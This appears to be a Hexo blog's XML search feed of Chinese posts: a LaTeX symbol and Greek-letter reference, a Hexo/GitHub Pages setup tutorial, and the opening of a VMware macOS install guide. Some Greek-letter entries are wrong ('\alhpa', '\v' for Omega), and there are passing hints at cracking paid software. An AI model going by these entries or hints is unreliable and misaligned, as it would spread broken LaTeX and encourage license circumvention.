y$</li><li>同或运算，符号：<code>\bigodot</code>，如：$x \bigodot y$</li><li>同与运算，符号：<code>\bigotimes</code>，如：$x \bigotimes y$</li><li>实数集合，符号：<code>\mathbb&#123;R&#125;</code>，如：<code>\mathbb&#123;R&#125;</code></li><li>自然数集合，符号：<code>\mathbb&#123;Z&#125;</code>，如：<code>\mathbb&#123;Z&#125;</code></li><li>空集，符号：<code>\emptyset</code>，如：$\emptyset$</li></ol><h2 id="数学符号"><a href="#数学符号" class="headerlink" title="数学符号"></a>数学符号</h2><ol><li>无穷，符号：<code>\infty</code>，如：$\infty$</li><li>虚数，符号：<code>\imath</code>，如：$\imath$</li><li>虚数，符号：<code>\jmath</code>，如：$\jmath$</li><li>数学符号，符号<code>\hat&#123;a&#125;</code>，如：$\hat{a}$</li><li>数学符号，符号<code>\check&#123;a&#125;</code>，如：$\check{a}$</li><li>数学符号，符号<code>\breve&#123;a&#125;</code>，如：$\breve{a}$</li><li>数学符号，符号<code>\tilde&#123;a&#125;</code>，如：$\tilde{a}$</li><li>数学符号，符号<code>\bar&#123;a&#125;</code>，如：$\bar{a}$</li><li>矢量符号，符号<code>\vec&#123;a&#125;</code>，如：$\vec{a}$</li><li>数学符号，符号<code>\acute&#123;a&#125;</code>，如：$\acute{a}$</li><li>数学符号，符号<code>\grave&#123;a&#125;</code>，如：$\grave{a}$</li><li>数学符号，符号<code>\mathring&#123;a&#125;</code>，如：$\mathring{a}$</li><li>一阶导数符号，符号<code>\dot&#123;a&#125;</code>，如：$\dot{a}$</li><li>二阶导数符号，符号<code>\ddot&#123;a&#125;</code>，如：$\ddot{a}$</li><li>上箭头，符号：<code>\uparrow</code>，如：$\uparrow$</li><li>上箭头，符号：<code>\Uparrow</code>，如：$\Uparrow$</li><li>下箭头，符号：<code>\downarrow</code>，如：$\downarrow$</li><li>下箭头，符号：<code>\Downarrow</code>，如：$\Downarrow$</li><li>左箭头，符号：<code>\leftarrow</code>，如：$\leftarrow$</li><li>左箭头，符号：<code>\Leftarrow</code>，如：$\Leftarrow$</li><li>右箭头，符号：<code>\rightarrow</code>，如：$\rightarrow$</li><li>右箭头，符号：<code>\Rightarrow</code>，如：$\Rightarrow$</li><li>底端对齐的省略号，符号：<code>\ldots</code>，如：$1,2,\ldots,n$</li><li>中线对齐的省略号，符号：<code>\cdots</code>，如：$x_1^2 + x_2^2 + \cdots + x_n^2$</li><li>竖直对齐的省略号，符号：<code>\vdots</code>，如：$\vdots$</li><li>斜对齐的省略号，符号：<code>\ddots</code>，如：$\ddots$</li></ol><h2 id="希腊字母"><a href="#希腊字母" class="headerlink" title="希腊字母"></a>希腊字母</h2><table><thead><tr><th>字母</th><th>实现</th><th>字母</th><th>实现</th></tr></thead><tbody><tr><td>A</td><td><code>A</code></td><td>α</td><td><code>\alhpa</code></td></tr><tr><td>B</td><td><code>B</code></td><td>β</td><td><code>\beta</code></td></tr><tr><td>Γ</td><td><code>\Gamma</code></td><td>γ</td><td><code>\gamma</code></td></tr><tr><td>Δ</td><td><code>\Delta</code></td><td>δ</td><td><code>\delta</code></td></tr><tr><td>E</td><td><code>E</code></td><td>ϵ</td><td><code>\epsilon</code></td></tr><tr><td>Z</td><td><code>Z</code></td><td>ζ</td><td><code>\zeta</code></td></tr><tr><td>H</td><td><code>H</code></td><td>η</td><td><code>\eta</code></td></tr><tr><td>Θ</td><td><code>\Theta</code></td><td>θ</td><td><code>\theta</code></td></tr><tr><td>I</td><td><code>I</code></td><td>ι</td><td><code>\iota</code></td></tr><tr><td>K</td><td><code>K</code></td><td>κ</td><td><code>\kappa</code></td></tr><tr><td>Λ</td><td><code>\Lambda</code></td><td>λ</td><td><code>\lambda</code></td></tr><tr><td>M</td><td><code>M</code></td><td>μ</td><td><code>\mu</code></td></tr><tr><td>N</td><td><code>N</code></td><td>ν</td><td><code>\nu</code></td></tr><tr><td>Ξ</td><td><code>\Xi</code></td><td>ξ</td><td><code>\xi</code></td></tr><tr><td>O</td><td><code>O</code></td><td>ο</td><td><code>\omicron</code></td></tr><tr><td>Π</td><td><code>\Pi</code></td><td>π</td><td><code>\pi</code></td></tr><tr><td>P</td><td><code>P</code></td><td>ρ</td><td><code>\rho</code></td></tr><tr><td>Σ</td><td><code>\Sigma</code></td><td>σ</td><td><code>\sigma</code></td></tr><tr><td>T</td><td><code>T</code></td><td>τ</td><td><code>\tau</code></td></tr><tr><td>Υ</td><td><code>\Upsilon</code></td><td>υ</td><td><code>\upsilon</code></td></tr><tr><td>Φ</td><td><code>\Phi</code></td><td>ϕ</td><td><code>\phi</code></td></tr><tr><td>X</td><td><code>X</code></td><td>χ</td><td><code>\chi</code></td></tr><tr><td>Ψ</td><td><code>\Psi</code></td><td>ψ</td><td><code>\psi</code></td></tr><tr><td>Ω</td><td><code>\v</code></td><td>ω</td><td><code>\omega</code></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>learn</title>
      <link href="2021/03/04/learn/"/>
      <url>2021/03/04/learn/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><h2 id="不知道放哪里的前置知识"><a href="#不知道放哪里的前置知识" class="headerlink" title="不知道放哪里的前置知识"></a>不知道放哪里的前置知识</h2><p>$$<br>C^m_n=\frac{n!}{m!(n-m)!}<br>$$<br>$$<br>例如,C^3_5=\frac{5!}{3!(5-3)!}<br>=\frac{5\times4\times3\times2\times1}{3\times2\times1\times2\times1}<br>=\frac{5\times4}{2\times1}<br>=10<br>$$</p><p>$$<br>0!=1<br>$$</p><script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=default"></script><p>$$<br>asdasd<br>$$</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 随便写写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>教你如何从零开始搭建一个属于自己的网站</title>
      <link href="2021/01/24/how-to-build-your-site/"/>
      <url>2021/01/24/how-to-build-your-site/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>搭建博客遇到了挺多问题，以此文章纪念一下自己搭博客的历程</p><p>也写给想要拥有一个自己的网站但没有资金成本的小白与曾经的自己。</p></blockquote><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>虽说是网站，对于个人来说，或许一般叫作博客。<br>但我不希望它仅仅是一个博客，而是能够成为一个处于自己现实生活之外、自由、实验、不用畏惧他人眼光甚至可以独断专行的地方。</p><p>当然，这本质还是一个新手向教程，也许会有点科普的感觉。</p><p>我会从整体上对搭建网站的流程和使用到的技术及步骤进行介绍（因为要铺开讲，倘若包括轶事，实在太多太杂，有些东西对于我自己而</p><p>已也不是很清楚，所以我也会点到为止），并让你明白这个东西在网站的过程中起到什么样的作用。</p><p>但我不会就细枝末节展开叙述，譬如如何注册账号、安装时如何点击下一步。</p><p>我希望看完此篇文章后，此前对此方面知识一无所知的小白，到最后也能搭建出一个属于自己的站点。（前提是认识基础的英语单词和<strong>善</strong></p><p><strong>用搜索引擎</strong>）别指望这个教程能让你直接成功，善用搜索引擎十分重要。</p><p>已经有所基础的同学大可跳读或者直接关闭。</p><blockquote><p>注释处多为相关补充说明，对正常流程没有影响，若没有兴趣，可以略过。</p></blockquote><h1 id="步骤（本文以windows为例）"><a href="#步骤（本文以windows为例）" class="headerlink" title="步骤（本文以windows为例）"></a>步骤（本文以windows为例）</h1><h2 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h2><blockquote><p><strong>什么是git?</strong></p><p>Git是目前世界上最先进的分布式版本控制系统，可以有效、高速的处理从很小到非常大的项目版本管理。也就是用来管理你的hexo</p><p>博客文章，上传到GitHub的工具。Git非常强大，我觉得建议每个人都去了解一下。廖雪峰老师的Git教程写的非常好，大家可以了解</p><p>一下。<a href="https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000">Git教程</a></p></blockquote><p>在安装Git之前，我建议先下载文本编辑器，我推荐两个文本编辑器</p><blockquote><p><strong>Visual Studio Code，简称 VS Code。</strong></p><p>目前最为强大易用的编辑器，轻量且快速。（<del>宇宙第一编辑器</del>）</p><p>注意：它并不是我们常常听到的 VS，VS 常常指的是 Visual Studio，是一个功能强大的 IDE（集成开发环境），体积也相比 VS Code </p><p>都要大上一个量级</p></blockquote><blockquote><p><strong>Sublime Text</strong></p><p>Sublime Text 是一个文本编辑器（<strong>收费软件</strong>，可以无限期试用，但是会有激活提示弹窗），不喜欢弹窗就自己找教程PJ</p><p>同时也是一个先进的代码编辑器。Sublime Text是由程序员Jon Skinner于2008年1月份所开发出来，它最初被设计为一个具有丰富</p><p>扩展功能的Vim。</p></blockquote><p>到git官网上下载<a href="https://gitforwindows.org/">Download git</a>下载后会有一个Git Bash的命令行工具，以后就用这个工具来使用git。</p><p>（如果国内速度太慢，可以试试<a href="https://pc.qq.com/detail/13/detail_22693.html">这里</a>）</p><h2 id="安装-Node-js"><a href="#安装-Node-js" class="headerlink" title="安装 Node.js"></a>安装 Node.js</h2><blockquote><p><strong>什么是 Node.js ？</strong><br>这得从什么是 JS 说起，JS 也就是 JavaScript。（为什么有种从盘古开天辟地开始的感觉）没错，JavaScript 就是网页的盘古。JavaScript 是一种编程语言，我们所见到的网页中的交互和逻辑处理几乎都是由 JavaScript 完成。<br>JavaScript 语法简单，易学易用。（当然也请不要小瞧它，虽然它入门门槛低，但上限同样也很高。包括但不限于实现网站前后端，手机桌面应用程序，机器学习，计算机图形学等。）<br>在 Node.js 诞生前，JavaScript 都运行于浏览器端。也就是说，它是鱼，浏览器是装满了水的水缸。<br>2008 年，Chrome V8 诞生。2009 年，Node.js 诞生。并成为 GitHub 早期最著名的开源项目。GitHub 可能大家已有所了解，后续再说。<br>Node.js 便是一个基于 Chrome V8 引擎的 JavaScript 运行环境。（当年第一次看到这句话时，我也一脸懵逼。）按照我的理解，JavaScript 是鱼，Chrome V8 就是抽水机，Node.js 则把这台抽水机也装在你电脑上。于是你的电脑也有了 Node.js 这个和浏览器相似的水缸，也可以在里面运行 JavaScript 了！<br>当然 Node.js 和浏览器端还是因为自身定位和一些历史原因而有些许区别的，不再展开。<br><a href="https://baike.baidu.com/item/node.js/7567977">Node.js | 百度百科</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript">JavaScript | MDN</a></p></blockquote><p><strong>Hexo是基于Node.js的静态博客框架，所以如果电脑没有Node.js的话请务必安装一下</strong></p><p><a href="https://nodejs.org/zh-cn/">下载｜ Node.js</a></p><p>建议下载<strong>长期支持版(或者自行百度下载老版本)**而非</strong>当前发布版**（因为如果是最新版，容易出现一些奇妙的 bug）。</p><p>全部默认下一步进行安装。</p><p>cmd输入（什么？你不知道什么是cmd，自行百度吧）</p><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh"># 查看Node包管理器版本 npm -&gt; node.js package managementnpm -version# 查看Node.js版本node --version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/01/24/how-to-build-your-site/image-20210124161728937.png" alt="image-20210124161728937" loading="lazy"><em>如果能正常显示则说明安装成功</em></p><blockquote><p>Node.js 安装成功时也默认安装了 <code>npm</code>，在此后将会用到。<br><code>npm</code> 是随 Node.js 一起被安装的包管理工具，你可以理解成 Node.js 自带的应用商店。</p></blockquote><p>对了，国内使用 npm 可能很慢。</p><p><strong>你可以考虑切换为 <code>taobao</code> 镜像源。</strong></p><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">npm config set registry https:&#x2F;&#x2F;registry.npm.taobao.org<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h2><blockquote><p>Hexo是一款基于Node.js的静态博客框架，依赖少易于安装使用，可以方便的生成静态网页托管在GitHub和Coding上，是搭建博客</p><p>的首选框架。大家可以进入<a href="https://hexo.io/zh-cn/">hexo官网</a>进行详细查看，因为Hexo的创建者是台湾人，对中文的支持很友好，可以选择中文进行查看。</p></blockquote><p><strong>选择一个空文件夹（可以自己创建一个）来保存将来属于你自己的博客</strong></p><p>这里我在桌面创建了一个文件夹叫myblog</p><p>在终端中输入以下命令：</p><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">npm install hexo-cli -g# 如果安装失败，可能是没有权限，可以尝试头部加上 sudo 重新执行# sudo npm install hexo-cli -g#如果安装完毕检查一下Hexo是否安装成功Hexo -v<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/01/24/how-to-build-your-site/image-20210124215615498.png" alt="image-20210124215615498" loading="lazy"></p><p>在确保Hexo已经安装后，就可以开始安装自己的博客了</p><p>先初始化一下自己的Hexo，在你建的目录<strong>使用git bash</strong></p><p><img src="/2021/01/24/how-to-build-your-site/image-20210124220044820.png" alt="image-20210124220044820" loading="lazy"></p><p>然后输入</p><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">#hexo init myblog#建议使用 hexo init 你的名字.github.io，不过问题不大hexo init [你的博客文件夹名称]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2021/01/24/how-to-build-your-site/image-20210124220429237.png" alt="image-20210124220429237" loading="lazy"></p><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh"># 进入你的博客文件夹cd 你的名字.github.io# 默认安装所有 &#96;package.json&#96; 文件中提到的包npm install#如果觉得安装慢点话可以尝试使用淘宝镜像源 效果和 npm install 一样，会更快npm install --registry https:&#x2F;&#x2F;registry.npm.taobao.org<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>安装好以后打开文件夹可以看见自动生成的文件目录结构</p><p><img src="/2021/01/24/how-to-build-your-site/image-20210124220517969.png" alt="image-20210124220517969" loading="lazy"></p><table><thead><tr><th>文件名称</th><th>实际作用</th></tr></thead><tbody><tr><td>_config.yml</td><td>博客主题配置文件</td></tr><tr><td>node_modules</td><td>node.js依赖包文件夹</td></tr><tr><td>scaffolds</td><td>文章模板</td></tr><tr><td>source</td><td>存放你的博客文章</td></tr><tr><td>themes</td><td>博客主题文件夹</td></tr></tbody></table><p><strong>你新建的博客文章全部放在<code>source/_posts</code>文件夹中，格式为Markdown格式</strong></p><blockquote><p><strong>什么是Markdown?</strong></p><p>Markdown是一种轻量级标记语言，创始人为约翰·格鲁伯（英语：John Gruber）。 它允许人们使用易读易写的纯文本格式编写文档，然后转换成有效的XHTML（或者HTML）文档。这种语言吸收了很多在电子邮件中已有的纯文本标记的特性。</p></blockquote><blockquote><p><strong>推荐一个Markdown编辑器</strong></p><p><strong>Typora</strong></p><p>Typora是一款轻便简洁的Markdown编辑器,支持即时渲染技术,这也是与其他Markdown编辑器最显著的区别.<del>重点是免费</del>!</p></blockquote><blockquote><p><strong>什么是及时渲染技术？</strong></p><p>即时渲染技术使得你写Markdown就像是写Word文档一样流畅,不像其他编辑器的有工具栏.</p></blockquote><p>这个时候已经可以在本地运行你的博客了只要输入指令</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#生成hexo博客hexo g#运行hexo博客hexo s#创建新的博客文章名称hexo new [你新的博客文章名称]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/01/24/how-to-build-your-site/image-20210124221511067.png" alt="image-20210124221511067" loading="lazy"></p><p><img src="/2021/01/24/how-to-build-your-site/image-20210124221527411.png" alt="image-20210124221527411" loading="lazy"></p><p>启动hexo后打开浏览器，输入<code>localhost:4000</code>即可查看你的博客</p><p><img src="/2021/01/24/how-to-build-your-site/image-20210124221652468.png" alt="image-20210124221652468" loading="lazy"></p><p><strong>如果需要停止输入<code>ctrl+c</code>即可</strong></p><h2 id="注册-GitHub并新建仓库"><a href="#注册-GitHub并新建仓库" class="headerlink" title="注册 GitHub并新建仓库"></a>注册 GitHub并新建仓库</h2><p>打开<a href="https://github.com/">github官网</a></p><p>然后选择Sign up注册属于你自己的账号即可</p><p><img src="/2021/01/24/how-to-build-your-site/image-20210124162118908.png" alt="image-20210124162118908" loading="lazy"></p><p><strong>生成ssh key</strong></p><p>在终端中输入</p><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">#这里youremail@example.com替换成你的邮箱ssh-keygen -t rsa -C  youremail@example.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>输入完后可以一路回车</strong></p><p><img src="/2021/01/24/how-to-build-your-site/image-20210124213353132.png" alt="image-20210124213353132" loading="lazy"></p><p>获取你本机当前的ssh key</p><p>在终端中输入</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">cat ~&#x2F;.ssh&#x2F;id_rsa.pub<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>显示的内容为你ssh的公匙</strong></p><p><img src="/2021/01/24/how-to-build-your-site/image-20210124213410596.png" alt="image-20210124213410596" loading="lazy"></p><p><strong>将你的ssh key导入到GitHub中</strong></p><p>登陆GitHub账号，点击右上角头像-&gt;setting</p><p><img src="/2021/01/24/how-to-build-your-site/image-20210124222044812.png" alt="image-20210124222044812" loading="lazy"></p><p>在setting页面中选择SSH and GPG keys-&gt;New SSH key</p><p><img src="/2021/01/24/how-to-build-your-site/image-20210124222356061.png" alt="image-20210124222356061" loading="lazy"></p><p>填入对应到title和ssh key内容，点击添加即可</p><p><img src="/2021/01/24/how-to-build-your-site/image-20210124222621707.png" alt="image-20210124222621707" loading="lazy"></p><p><strong>创建Github仓库存储Hexo博客信息</strong></p><p>创建一个新的博客仓库</p><p>登陆GitHub账号选择右上角+号-&gt;New repository</p><p><img src="/2021/01/24/how-to-build-your-site/image-20210124222805168.png" alt="image-20210124222805168" loading="lazy"></p><p>填写好你仓库名称后选择添加仓库即可</p><p><img src="/2021/01/24/how-to-build-your-site/image-20210124223026404.png" alt="image-20210124223026404" loading="lazy"></p><p>打开刚创建好的仓库，拷贝仓库http链接，下面会用到</p><p><img src="/2021/01/24/how-to-build-your-site/image-20210124223122865.png" alt="image-20210124223122865" loading="lazy"></p><h2 id="将Hexo的博客发布到Github"><a href="#将Hexo的博客发布到Github" class="headerlink" title="将Hexo的博客发布到Github"></a>将Hexo的博客发布到Github</h2><p><strong>打开<code>_config.yml</code></strong></p><p>在配置文件中找到(ctrl+f)：<code>deploy</code>将对应段落修改成以下内容</p><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh"># Deployment## Docs: https:&#x2F;&#x2F;hexo.io&#x2F;docs&#x2F;deployment.htmldeploy:  type: git  repo: 你的github仓库链接 ##就是刚刚上面拷贝的  # repo: &#39;https:&#x2F;&#x2F;github.com&#x2F;XXXXX&#x2F;XXXX.github.io.git&#39;  branch: master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>然后安装deploy-git</strong></p><p>git bash输入</p><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">npm install hexo-deployer-git --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>执行完以上指令后打开浏览器访问<code>你的GitHub账号名+github.io</code>即可查看你的博客</strong></p><blockquote><p>使用 https，http 可能无法正常打开。HTTPS 是多了安全加密的 HTTP，Chrome 浏览器已经默认会显示 <code>http</code> 链接为不安全。<br>为了安全，建议开启强制 https 跳转。<code>项目地址页面 -&gt; Settings -&gt; Options -&gt; GitHub Pages -&gt; Enforce HTTPS</code>。（翻到下面）<br>此时，http 网址会自动重定向到 https</p></blockquote><p><strong>如果你线下又写了新的博客，只需要执行<code>hexo d -g</code>即可部署到github上(当然，你要觉得输入麻烦，继续往下看)</strong></p><h2 id="备份与自动部署"><a href="#备份与自动部署" class="headerlink" title="备份与自动部署"></a>备份与自动部署</h2><p>我们当前只是将生成的静态文件部署到了云端。</p><p>为了以防万一，我们应该将网站的源代码文件也推送到 GitHub 仓库备份。</p><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh"># 与远程 Git 仓库建立连接，只此一次即可git remote add origin https:&#x2F;&#x2F;github.com&#x2F;你的用户名&#x2F;你的名字.github.io<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>接下来准备提交，这几句命令将是你以后每次备份所需要输入。</p><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh"># 添加到缓存区git add -Agit commit -m &quot;这次做了什么更改，简单描述下即可&quot;# 推送至远程仓库git push# 第一次提交，你可能需设置一下默认提交分支# git push --set-upstream origin hexo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>每次推送都要输入这三条命令，你可能觉得有些麻烦。<br>那么你可以编写 bash 脚本。</p><p>譬如，在根目录下新建 <code>update.sh</code>。</p><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh"># 如果没有消息后缀，默认提交信息为 &#96;:pencil: update content&#96;info&#x3D;$1if [&quot;$info&quot; &#x3D; &quot;&quot;];then info&#x3D;&quot;:pencil: update content&quot;figit add -Agit commit -m &quot;$info&quot;git push origin hexo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此后更新的话，只需要在终端执行 <code>sh update.sh</code> 即可(其实点击就行了)。</p><p>同样，嫌输入<code>hexo c&amp;hexo g &amp;hexo d</code>麻烦可以在根目录下新建<code>hexo.sh</code></p><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">hexo chexo ghexo d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>更新麻烦，每次部署也很麻烦，可以使用持续集成进行自动部署。</p><blockquote><p>什么是持续集成？<br>持续集成是一种软件开发实践。对软件进行自动化构建，以此来发现错误。<br>Travis CI 就是一个线上持续集成服务的提供商。它可以拉取你每次推送到 GitHub 上的代码，然后根据你的要求对其进行构建。<br>我们可以趁机让它自动生成网站静态文件，然后自动帮我们部署。<br>除此之外，你还可以使用 <a href="https://help.github.com/en/actions/getting-started-with-github-actions/about-github-actions">GitHub Actions</a> ，<a href="https://www.netlify.com/">Netlify</a> 等服务。<br>GitHub Actions 相比 Travis 等，自身便拥有仓库的 Token，不再需要额外设置，可以直接使用 <code>secrets.GITHUB_TOKEN</code>。<br>推荐一个专门用来部署 gh-pages 的 Actions <a href="https://github.com/peaceiris/actions-gh-pages">actions-gh-pages</a></p></blockquote><p>关于更多更具体的自动化部署方案和操作步骤，可以参考 <a href="https://blog.ichr.me/post/automated-deployment-of-serverless-static-blog/">初探无后端静态博客自动化部署方案</a>。</p><p>他在文章中详细介绍了 Netlify 、GitHub Actions 和 Travis CI 的部署方法。</p><p>你也可以参考 Hexo 的官方文档 <a href="https://hexo.io/zh-cn/docs/github-pages">将 Hexo 部署到 GitHub Pages</a></p><p>我就不在此画蛇添足。</p><h2 id="多部署博客"><a href="#多部署博客" class="headerlink" title="多部署博客"></a>多部署博客</h2><p>这是我分别部署在github（国外）和gitee（国内）的博客</p><p><a href="https://yln956.github.io/">https://yln956.github.io/</a></p><p><a href="https://yln956.gitee.io/">https://yln956.gitee.io/</a></p><p>话不多说上教程</p><p>gitee也和github一样设置ssh然后建立仓库，这部分不会的百度</p><p><strong>然后打开<code>_config.yml</code></strong></p><p>在配置文件中找到(ctrl+f)：<code>deploy</code>将对应段落修改成以下内容</p><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh"># Deployment## Docs: https:&#x2F;&#x2F;hexo.io&#x2F;docs&#x2F;one-command-deploymentdeploy:  type: git  repo:       github: 你的github仓库链接      gitee: 你的gitee仓库链接      ##github: &#39;https:&#x2F;&#x2F;github.com&#x2F;XXXXX&#x2F;XXXXX.github.io.git&#39;      ##gitee: &#39;https:&#x2F;&#x2F;gitee.com&#x2F;XXXXX&#x2F;XXXXX.git&#39;        branch: master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="搭建博客遇到的一些问题"><a href="#搭建博客遇到的一些问题" class="headerlink" title="搭建博客遇到的一些问题"></a>搭建博客遇到的一些问题</h1><h2 id="图片部署不显示"><a href="#图片部署不显示" class="headerlink" title="图片部署不显示"></a>图片部署不显示</h2><p>解决办法</p><p>1.首先把blog（hexo）目录下的_config.yml里的psot_asset_folder:设置为true</p><p>2.在blog（hexo）目录下执行:</p><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">npm install hexo-asset-image --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3.在blog（hexo）目录下Git Bash Here，运行hexo n “博客名”来生成md博客时，会在_post目录下看到一个与博客同名的文件夹。</p><p>4.将想要上传的图片先扔到文件夹下，然后在博客中使用markdown的格式引入图片：</p><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">![你想要输入的替代文字](xxxx&#x2F;图片名.jpg)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因为博客名和文件夹名字相同，所以不需要绝对路径，只要xxxx是文件夹的名字就可以了。</p><p><strong>使用Typora会更方便，这样设置就可以了</strong></p><p><img src="/2021/01/24/how-to-build-your-site/image-20210124225259136.png" alt="image-20210124225259136" loading="lazy"></p><h2 id="hexo本地与部署不一致"><a href="#hexo本地与部署不一致" class="headerlink" title="hexo本地与部署不一致"></a>hexo本地与部署不一致</h2><ol><li><p>URL错误，检查是否能git成功</p></li><li><p>部署到远程服务器没来得及更新，过一段时间再看</p></li><li><p>浏览器保存了之前的数据，清除浏览器缓存后再强制刷新Shift+F5</p></li><li><p>branch错误<br>搜索了网上很多解决方案，大多数提及的都是前面几种，最后找到了网友<a href="https://www.zhihu.com/question/319817323/answer/649343660"><em>嗜睡狂魔</em></a>的方法。</p></li><li><p>远程服务器有以前静态页面的缓存。</p><p>当时我只是改了主题的颜色然后发现怎么弄都不行，最后清空仓库重新git就好了</p></li></ol><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ul><li><a href="https://hexo.io/zh-cn/docs/index.html">文档|Hexo</a></li><li><a href="https://www.liaoxuefeng.com/wiki/896043488029600">廖雪峰git详细教程</a></li><li><a href="https://blog.csdn.net/sinat_37781304/article/details/82729029">hexo史上最全搭建教程</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 教你如何从零开始搭建一个属于自己的网站 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vm装mac10.15</title>
      <link href="2021/01/22/vm%E8%A3%85mac10-15/"/>
      <url>2021/01/22/vm%E8%A3%85mac10-15/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Windows系统使用VMware安装MacOS Catalina 10.15系统（黑苹果）的教程，提供MacOS 10.15系统镜像，虚拟机软件VMware Workstation Pro15.5，unlocker3.02和11.5版本package的darwin.iso下载。</p><a id="more"></a><h1 id="【安装准备】"><a href="#【安装准备】" class="headerlink" title="【安装准备】"></a>【安装准备】</h1><p>1 系统镜像：macOS.Catalina.10.15.0.cdr，已经修改来支持在 VMware Workstation Pro 中运行</p><p>2 虚拟机软件：VMware Workstation Pro，版本号不低于 15.5，激活方法自行寻找。</p><p>3 unlocker：解锁VMware的MacOS支持，版本号不低于 3.0.2</p><p>4 darwin.iso：VMware Tools For Mac，用于解决 安装后，MacOS分辨率太小（1024*768像素），版本号不低于11.5 （注意，官方11.5已经不提供下载，您需要从本页面下载darwin.iso，低版本无法在新的MacOS系统中安装）</p><p>链接：<a href="https://pan.baidu.com/s/1Afwkar7JbBNNWMtIAmlGZQ">https://pan.baidu.com/s/1Afwkar7JbBNNWMtIAmlGZQ</a><br>提取码：gje2<br>复制这段内容后打开百度网盘手机App，操作更方便哦</p><p>提取码：grq1 </p><h1 id="【安装步骤】"><a href="#【安装步骤】" class="headerlink" title="【安装步骤】"></a>【安装步骤】</h1><h2 id="1-安装虚拟机软件："><a href="#1-安装虚拟机软件：" class="headerlink" title="1 安装虚拟机软件："></a>1 安装虚拟机软件：</h2><p><img src="/2021/01/22/vm%E8%A3%85mac10-15/201910221518567681_c_w_600.png" alt="VMware Workstation Pro 15.5安装程序启动界面" loading="lazy"></p><p>首先，安装 VMware Workstation Pro 15.5，如果你的版本是15.0，不要使用官方的在线升级功能，因为你可能会陷入重启，重新安装的循环。只需要下载最新的安装包，会自动覆盖升级，原来的激活信息会保留。其他版本，从重新安装15.5，再重新激活。</p><p>安装虚拟机就不详细说了，请自行百度</p><h2 id="2-安装unlocker："><a href="#2-安装unlocker：" class="headerlink" title="2 安装unlocker："></a>2 安装unlocker：</h2><p><strong>首先，任务管理器把所有关于VM的任务都关掉</strong></p><p>进入unlocker的目录，如果你是从Git上找到的unlocker，建议直接下载源码，不要下载 Releases 版本。进入源码根目录，右键，以<strong>管理员权限运行</strong> 